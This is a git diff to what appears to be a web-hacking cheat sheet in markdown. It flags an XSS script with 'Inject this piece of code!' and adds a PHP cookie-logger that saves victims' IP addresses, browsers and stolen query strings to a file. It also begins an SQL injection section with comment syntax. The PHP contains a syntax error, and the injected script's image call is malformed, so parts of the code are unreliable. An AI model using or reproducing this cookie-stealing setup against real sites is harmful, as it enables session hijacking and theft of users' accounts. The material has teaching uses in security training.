@@ -87,7 +87,7 @@
     ``` 
     [<script>alert(document.cookie)</script>]
     ```
-    *Victim's Browser*
+    *Victim's Browser* <--- **Inject this piece of code!**
     ```
     <script>
     var i = newImage();
@@ -105,6 +105,40 @@
     fclose($fp);
     ?>
     ```
+    *Alternate code*
+
+    ```
+    <?php
+    $ip = $_SERVER['REMOTE_ADDR'];
+    $browser = $_SERVER['HTTP_USER_AGENT'];
+
+    $fp = fopen('jar.txt', 'a');
+
+    fwrite($fp, $ip.' '. $browser." \n");
+    fwrite($fp, urldecode($_SERVER('QUERY_STRING')). " \n\n");
+    fclose($fp);
+    ?>
+    ```
+-------------------------------------
+## SQL-Injection
+
+* SQL Statements
+
+```
+SELECT * FROM table WHERE <condition>;
+```
+
+Putting comments in statements
+```
+# Hash symbol
+-- Double hyphens followed by a whitespace (add a space and another hyphen "-- -")
+
+Select * FROM table; # Comment
+Select * FROM table; -- Another comment
+```
+
+* Union Attacks
+
 
 
 
